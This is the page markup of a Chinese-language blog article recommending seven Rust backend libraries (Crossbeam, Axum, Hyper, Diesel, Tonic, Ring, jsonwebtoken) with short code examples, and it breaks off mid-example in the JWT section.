itemprop="keywords" content="åç«¯,Rust"/> <meta itemprop="datePublished" content="2025-12-29T07:43:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¯¥ç”¨æˆ·å·²ä¸å­˜åœ¨"/> <meta itemprop="url" content="https://juejin.cn/user/64217584778579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            7ä¸ªæ„å»ºé«˜æ€§èƒ½åç«¯çš„ Rust å¿…å¤‡åº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/64217584778579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¯¥ç”¨æˆ·å·²ä¸å­˜åœ¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:43:59.000Z" title="Mon Dec 29 2025 07:43:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Rust çš„å†…å­˜å®‰å…¨ç‰¹æ€§å›ºç„¶æ˜¯å…¶å®‰èº«ç«‹å‘½ä¹‹æœ¬ï¼Œä½†å¯¹äºä¸€çº¿å¼€å‘è€…è€Œè¨€ï¼Œä¸°å¯Œçš„ç”Ÿæ€æ‰æ˜¯æå‡ç”Ÿäº§åŠ›çš„å…³é”®ã€‚ä»æ—©æœŸçš„åŸºç¡€è®¾æ–½å»ºè®¾ï¼Œåˆ°å¦‚ä»Šçš„åº”ç”¨å±‚çˆ†å‘ï¼ŒRust ç¤¾åŒºæ¶Œç°å‡ºäº†è®¸å¤šé«˜è´¨é‡çš„ Cratesã€‚</p>
<p>ä»¥ä¸‹æ•´ç†äº† 7 ä¸ªåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¡¨ç°ç¨³å¥ã€èƒ½åˆ‡å®è§£å†³ç—›ç‚¹çš„ Rust åº“ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d10a7e060bda4c5d87d3e649d6cfa824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K-l55So5oi35bey5LiN5a2Y5Zyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767599039&amp;x-signature=0qfFvej34tjdl1vM8zvnKhmwt%2B8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-0">Crossbeam â€”â€” å¹¶å‘ç¼–ç¨‹çš„è¡¥å…¨è®¡åˆ’</h3>
<p>Rust æ ‡å‡†åº“æä¾›äº†åŸºç¡€çš„çº¿ç¨‹å’Œé€šé“æ”¯æŒï¼Œä½†åœ¨å¤„ç†å¤æ‚çš„å¹¶å‘åœºæ™¯æ—¶ï¼Œå¾€å¾€æ˜¾å¾—ä¸å¤Ÿé¡ºæ‰‹ã€‚Crossbeam æ˜¯ä¸€å¥—å¹¶å‘ç¼–ç¨‹å·¥å…·é›†ï¼Œå®ƒå¡«è¡¥äº†æ ‡å‡†åº“çš„ç©ºç™½ï¼Œç‰¹åˆ«æ˜¯æä¾›äº†é«˜æ€§èƒ½çš„æ— é”æ•°æ®ç»“æ„ï¼ˆLock-free Data Structuresï¼‰ã€‚</p>
<p>ç›¸æ¯”äºä½¿ç”¨ <code>Mutex</code> å¸¦æ¥çš„é”ç«äº‰å¼€é”€ï¼ŒCrossbeam çš„ <code>SegQueue</code> åœ¨å¤šç”Ÿäº§è€…ã€å¤šæ¶ˆè´¹è€…çš„åœºæ™¯ä¸‹è¡¨ç°æ›´ä¸ºä¼˜å¼‚ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>ä½¿ç”¨ <code>SegQueue</code> å®ç°ä¸€ä¸ªç®€å•çš„å¤šçº¿ç¨‹æ—¥å¿—æ”¶é›†é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> crossbeam::queue::SegQueue;
<span class="hljs-keyword">use</span> std::sync::Arc;
<span class="hljs-keyword">use</span> std::thread;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè·¨çº¿ç¨‹å…±äº«çš„æ— é”é˜Ÿåˆ—</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">log_queue</span> = Arc::<span class="hljs-title function_ invoke__">new</span>(SegQueue::<span class="hljs-title function_ invoke__">new</span>());
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">tasks</span> = <span class="hljs-built_in">vec!</span>[];

    <span class="hljs-comment">// æ¨¡æ‹Ÿ4ä¸ªå·¥ä½œçº¿ç¨‹å¹¶å‘å†™å…¥æ—¥å¿—</span>
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">4</span> {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">q</span> = Arc::<span class="hljs-title function_ invoke__">clone</span>(&amp;log_queue);
        tasks.<span class="hljs-title function_ invoke__">push</span>(thread::<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-keyword">move</span> || {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">log_entry</span> = <span class="hljs-built_in">format!</span>(<span class="hljs-string">"Worker {} done"</span>, i);
            q.<span class="hljs-title function_ invoke__">push</span>(log_entry);
        }));
    }

    <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆ</span>
    <span class="hljs-keyword">for</span> <span class="hljs-variable">t</span> <span class="hljs-keyword">in</span> tasks {
        t.<span class="hljs-title function_ invoke__">join</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    }

    <span class="hljs-comment">// ä¸»çº¿ç¨‹æ¶ˆè´¹é˜Ÿåˆ—æ•°æ®</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(entry) = log_queue.<span class="hljs-title function_ invoke__">pop</span>() {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Log received: {}"</span>, entry);
    }
}
</code></pre>
<h3 data-id="heading-1">Axum â€”â€” å…¼é¡¾äººä½“å·¥å­¦ä¸æ€§èƒ½çš„ Web æ¡†æ¶</h3>
<p>Axum æ˜¯ç›®å‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.servbay.com" target="_blank" title="https://www.servbay.com" ref="nofollow noopener noreferrer">Rust åç«¯å¼€å‘</a>çš„ä¸»æµé€‰æ‹©ã€‚å®ƒç”± Tokio å›¢é˜Ÿç»´æŠ¤ï¼Œæœ€å¤§çš„ä¼˜åŠ¿åœ¨äºå¯¹ Rust ç±»å‹ç³»ç»Ÿçš„æè‡´åˆ©ç”¨ã€‚å®ƒä¸éœ€è¦å¤æ‚çš„å®é­”æ³•ï¼Œåˆ©ç”¨ Traits å°±èƒ½å®ç°æå…¶ç®€æ´çš„è¯·æ±‚å¤„ç†é€»è¾‘ã€‚</p>
<p>å®ƒå¤©ç„¶é›†æˆ Tower ä¸­é—´ä»¶ç”Ÿæ€ï¼Œä¸”å®Œå…¨å¼‚æ­¥ã€‚å¯¹äºä¹ æƒ¯äº†ç±»ä¼¼äº Gin (Go) æˆ– Express (Node) çš„å¼€å‘è€…æ¥è¯´ï¼ŒAxum çš„ä¸Šæ‰‹ä½“éªŒéå¸¸å¹³æ»‘ï¼Œä½†æ€§èƒ½å´æ˜¯ Rust çº§åˆ«çš„ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>æ„å»ºä¸€ä¸ªè¿”å›ç³»ç»ŸçŠ¶æ€çš„ JSON æ¥å£ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> axum::{
    routing::get,
    Json, Router,
};
<span class="hljs-keyword">use</span> serde::Serialize;
<span class="hljs-keyword">use</span> tokio::net::TcpListener;

<span class="hljs-meta">#[derive(Serialize)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SystemStatus</span> {
    uptime: <span class="hljs-type">u64</span>,
    service: <span class="hljs-type">String</span>,
}

<span class="hljs-comment">// å¤„ç†å‡½æ•°ï¼šç›´æ¥è¿”å›å®ç°äº† IntoResponse çš„ç±»å‹</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">status_handler</span>() <span class="hljs-punctuation">-&gt;</span> Json&lt;SystemStatus&gt; {
    <span class="hljs-title function_ invoke__">Json</span>(SystemStatus {
        uptime: <span class="hljs-number">3600</span>,
        service: <span class="hljs-string">"payment-gateway"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
    })
}

<span class="hljs-meta">#[tokio::main]</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">app</span> = Router::<span class="hljs-title function_ invoke__">new</span>().<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">"/api/status"</span>, <span class="hljs-title function_ invoke__">get</span>(status_handler));
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">listener</span> = TcpListener::<span class="hljs-title function_ invoke__">bind</span>(<span class="hljs-string">"0.0.0.0:3000"</span>).<span class="hljs-keyword">await</span>.<span class="hljs-title function_ invoke__">unwrap</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Server running on port 3000"</span>);
    
    axum::<span class="hljs-title function_ invoke__">serve</span>(listener, app).<span class="hljs-keyword">await</span>.<span class="hljs-title function_ invoke__">unwrap</span>();
}
</code></pre>
<h3 data-id="heading-2">Hyper â€”â€” HTTP åè®®çš„åº•å±‚å¼•æ“</h3>
<p>è™½ç„¶å¤§å¤šæ•°ä¸šåŠ¡å¼€å‘ä¼šä½¿ç”¨ Axumï¼Œä½†äº†è§£ Hyper è‡³å…³é‡è¦ã€‚å®ƒæ˜¯ Axumã€Tonic ç­‰æ¡†æ¶çš„åº•å±‚åŸºçŸ³ã€‚Hyper æ˜¯ä¸€ä¸ªçº¯ç²¹çš„ã€ä½çº§åˆ«çš„ HTTP å®ç°ï¼Œæ”¯æŒ HTTP/1 å’Œ HTTP/2ã€‚</p>
<p>å½“éœ€è¦æ„å»ºæé«˜æ€§èƒ½çš„ç½‘å…³ã€ä»£ç†ï¼Œæˆ–è€…éœ€è¦å¯¹ HTTP æ¡æ‰‹è¿‡ç¨‹è¿›è¡Œç²¾ç»†æ§åˆ¶æ—¶ï¼ŒHyper æ˜¯å”¯ä¸€é€‰æ‹©ã€‚å®ƒæ²¡æœ‰è·¯ç”±ã€ä¸­é—´ä»¶ç­‰é«˜çº§æŠ½è±¡ï¼Œåªå…³æ³¨å­—èŠ‚åœ¨ç½‘ç»œä¸Šçš„é«˜æ•ˆä¼ è¾“ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>ä½¿ç”¨ Hyper æ„å»ºä¸€ä¸ªæœ€åŸºç¡€çš„å›æ˜¾æœåŠ¡</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::convert::Infallible;
<span class="hljs-keyword">use</span> hyper::service::{make_service_fn, service_fn};
<span class="hljs-keyword">use</span> hyper::{Body, Request, Response, Server};

<span class="hljs-comment">// æç®€çš„å¤„ç†é€»è¾‘ï¼šæ¥æ”¶è¯·æ±‚ï¼Œè¿”å›å“åº”</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">echo</span>(req: Request&lt;Body&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;Response&lt;Body&gt;, Infallible&gt; {
    <span class="hljs-title function_ invoke__">Ok</span>(Response::<span class="hljs-title function_ invoke__">new</span>(Body::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-built_in">format!</span>(
        <span class="hljs-string">"Hyper received request to: {}"</span>,
        req.<span class="hljs-title function_ invoke__">uri</span>()
    ))))
}

<span class="hljs-meta">#[tokio::main]</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">addr</span> = ([<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>], <span class="hljs-number">4000</span>).<span class="hljs-title function_ invoke__">into</span>();

    <span class="hljs-comment">// æ„å»ºæœåŠ¡å·¥å‚</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">make_svc</span> = <span class="hljs-title function_ invoke__">make_service_fn</span>(|_conn| <span class="hljs-keyword">async</span> {
        Ok::&lt;_, Infallible&gt;(<span class="hljs-title function_ invoke__">service_fn</span>(echo))
    });

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">server</span> = Server::<span class="hljs-title function_ invoke__">bind</span>(&amp;addr).<span class="hljs-title function_ invoke__">serve</span>(make_svc);

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Err</span>(e) = server.<span class="hljs-keyword">await</span> {
        eprintln!(<span class="hljs-string">"Server error: {}"</span>, e);
    }
}
</code></pre>
<h3 data-id="heading-3">Diesel â€”â€” ç¼–è¯‘æœŸä¿éšœçš„ ORM</h3>
<p>ORM æ¡†æ¶æœ€å¸¸è§çš„é—®é¢˜æ˜¯æ‹¼å†™é”™è¯¯çš„ SQL è¯­å¥è¦ç­‰åˆ°è¿è¡Œæ—¶æ‰èƒ½å‘ç°ã€‚Diesel å´ä¸èµ°å¯»å¸¸è·¯ï¼Œå®ƒåˆ©ç”¨äº† Rust å¼ºå¤§çš„å®å’Œç±»å‹ç³»ç»Ÿï¼Œåœ¨ç¼–è¯‘é˜¶æ®µæ£€æŸ¥ SQL çš„åˆæ³•æ€§ã€‚</p>
<p>å¦‚æœå°è¯•æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„å­—æ®µï¼Œæˆ–è€…å°†å­—ç¬¦ä¸²å­˜å…¥æ•´å‹åˆ—ï¼Œä»£ç å°†æ— æ³•ç¼–è¯‘é€šè¿‡ã€‚è¿™ç§å¼ºä¸€è‡´æ€§æå¤§é™ä½äº†çº¿ä¸Š Bug çš„æ¦‚ç‡ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>æŸ¥è¯¢æ´»è·ƒç”¨æˆ·åˆ—è¡¨ï¼ˆæ³¨ï¼šéœ€é…åˆ Schema å®šä¹‰ï¼‰ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> diesel::prelude::*;
<span class="hljs-comment">// å‡è®¾ schema.rs ä¸­å®šä¹‰äº† users è¡¨ç»“æ„</span>
<span class="hljs-comment">// use crate::schema::users::dsl::*;</span>

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_active_users</span>(conn: &amp;<span class="hljs-keyword">mut</span> SqliteConnection) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt; {
    <span class="hljs-comment">// ç¼–è¯‘æœŸæ£€æŸ¥ï¼šå¦‚æœ 'is_active' å­—æ®µä¸å­˜åœ¨ï¼Œç¼–è¯‘æŠ¥é”™</span>
    <span class="hljs-comment">// users.filter(is_active.eq(true))</span>
    <span class="hljs-comment">//      .select(username)</span>
    <span class="hljs-comment">//      .load::&lt;String&gt;(conn)</span>
    <span class="hljs-comment">//      .expect("Database query failed")</span>
    <span class="hljs-built_in">vec!</span>[] <span class="hljs-comment">// ä»…ä½œæ¼”ç¤ºï¼Œå®é™…è¿”å›æŸ¥è¯¢ç»“æœ</span>
}
</code></pre>
<h3 data-id="heading-4">Tonic â€”â€” gRPC å¾®æœåŠ¡çš„æ ‡å‡†è§£</h3>
<p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒgRPC å› å…¶é«˜æ€§èƒ½å’Œå¤šè¯­è¨€æ”¯æŒè€Œæˆä¸ºé¦–é€‰ã€‚Rust ç”Ÿæ€ä¸­çš„ Tonic æ˜¯ç›®å‰æœ€æˆç†Ÿçš„ gRPC æ¡†æ¶ã€‚</p>
<p>å®ƒåŸºäº <code>prost</code>ï¼ˆç”¨äºå¤„ç† Protocol Buffersï¼‰å’Œ <code>tower</code>ï¼Œæä¾›äº†å¼€ç®±å³ç”¨çš„ HTTP/2 æ”¯æŒã€‚å¼€å‘è€…åªéœ€å®šä¹‰ <code>.proto</code> æ–‡ä»¶ï¼ŒTonic ä¼šè‡ªåŠ¨ç”Ÿæˆå¼ºç±»å‹çš„æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä»£ç ï¼Œå¼€å‘ä½“éªŒéå¸¸æµç•…ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>å®ç°ä¸€ä¸ªç®€å•çš„æ”¯ä»˜æœåŠ¡æ¥å£ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> tonic::{transport::Server, Request, Response, Status};

<span class="hljs-comment">// å‡è®¾ç”± proto ç”Ÿæˆçš„ä»£ç æ¨¡å—</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">mod</span> payment {
    <span class="hljs-comment">// tonic::include_proto!("payment"); </span>
    <span class="hljs-comment">// æ¨¡æ‹Ÿç”Ÿæˆçš„ç»“æ„ä½“</span>
    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">PayRequest</span> { <span class="hljs-keyword">pub</span> amount: <span class="hljs-type">u32</span> }
    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">PayResponse</span> { <span class="hljs-keyword">pub</span> success: <span class="hljs-type">bool</span> }
    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">trait</span> <span class="hljs-title class_">PaymentService</span> {
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(&amp;<span class="hljs-keyword">self</span>, r: Request&lt;PayRequest&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;Response&lt;PayResponse&gt;, Status&gt;;
    }
}
<span class="hljs-keyword">use</span> payment::{PaymentService, PayRequest, PayResponse};

<span class="hljs-meta">#[derive(Debug, Default)]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPaymentService</span>;

<span class="hljs-comment">// #[tonic::async_trait] </span>
<span class="hljs-comment">// impl PaymentService for MyPaymentService {</span>
<span class="hljs-comment">//     async fn process(&amp;self, request: Request&lt;PayRequest&gt;) -&gt; Result&lt;Response&lt;PayResponse&gt;, Status&gt; {</span>
<span class="hljs-comment">//         println!("Processing payment: {}", request.into_inner().amount);</span>
<span class="hljs-comment">//         Ok(Response::new(PayResponse { success: true }))</span>
<span class="hljs-comment">//     }</span>
<span class="hljs-comment">// }</span>

<span class="hljs-meta">#[tokio::main]</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">addr</span> = <span class="hljs-string">"[::1]:50051"</span>.<span class="hljs-title function_ invoke__">parse</span>()?;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">service</span> = MyPaymentService::<span class="hljs-title function_ invoke__">default</span>();

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"gRPC server listening on {}"</span>, addr);
    
    <span class="hljs-comment">// Server::builder()</span>
    <span class="hljs-comment">//     .add_service(payment::PaymentServiceServer::new(service))</span>
    <span class="hljs-comment">//     .serve(addr)</span>
    <span class="hljs-comment">//     .await?;</span>
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<h3 data-id="heading-5">Ring â€”â€” ä¸¥è°¨çš„å¯†ç å­¦å®ç°</h3>
<p>åœ¨æ¶‰åŠå®‰å…¨çš„ä»£ç ä¸­ï¼Œèƒ½è·‘æ˜¯ä¸å¤Ÿçš„ï¼Œå¿…é¡»æ­£ç¡®çš„ã€‚Ring æ˜¯ä¸€ä¸ªä¸“æ³¨äºå®‰å…¨æ€§å’Œæ€§èƒ½çš„åŠ å¯†åº“ï¼Œå®ƒå¤§éƒ¨åˆ†æ ¸å¿ƒä»£ç ä½¿ç”¨æ±‡ç¼–å’Œ Rust ç¼–å†™ã€‚</p>
<p>Ring çš„ API è®¾è®¡éµå¾ª "Hard to misuse"ï¼ˆéš¾ä»¥è¯¯ç”¨ï¼‰åŸåˆ™ã€‚å®ƒä¸åƒ OpenSSL é‚£æ ·æš´éœ²ç¹æ‚çš„é€‰é¡¹ï¼Œè€Œæ˜¯æä¾›ç»è¿‡å®‰å…¨å®¡è®¡çš„é«˜çº§æ¥å£ï¼Œé¿å…å¼€å‘è€…å› é…ç½®ä¸å½“å¯¼è‡´å®‰å…¨æ¼æ´ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>è®¡ç®—æ•æ„Ÿæ•°æ®çš„ SHA-256 æŒ‡çº¹ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> ring::digest;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw_data</span> = <span class="hljs-string">"user_password_salt"</span>;
    <span class="hljs-comment">// ä½¿ç”¨ SHA256 ç®—æ³•</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">actual_hash</span> = digest::<span class="hljs-title function_ invoke__">digest</span>(&amp;digest::SHA256, raw_data.<span class="hljs-title function_ invoke__">as_bytes</span>());
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Data fingerprint: {:?}"</span>, actual_hash);
}
</code></pre>
<h3 data-id="heading-6">JWT (jsonwebtoken) â€”â€” æ— çŠ¶æ€è®¤è¯</h3>
<p>åœ¨å‰åç«¯åˆ†ç¦»çš„æ¶æ„ä¸­ï¼ŒToken è®¤è¯æ˜¯æ ‡å‡†æ“ä½œã€‚<code>jsonwebtoken</code> åº“æä¾›äº†å®Œæ•´çš„ JWT ç”Ÿæˆä¸éªŒè¯åŠŸèƒ½ã€‚å®ƒä¸ <code>serde</code> ç»“åˆç´§å¯†ï¼Œå…è®¸å¼€å‘è€…ç›´æ¥å°† Rust ç»“æ„ä½“åºåˆ—åŒ–ä¸º Token çš„ Payloadã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<p>ç”Ÿæˆä¸€ä¸ªåŒ…å«è‡ªå®šä¹‰è§’è‰²ä¿¡æ¯çš„ Tokenï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> jsonwebtoken::{encode, Header, EncodingKey};
<span class="hljs-keyword">use</span> serde::{Serialize, Deserialize};
<span class="hljs-keyword">use</span> std::time::{SystemTime, UNIX_EPOCH};

<span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">AuthClaims</span> {
    sub: <span class="hljs-type">String</span>,
    role: <span class="hljs-type">String</span>,
    exp: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
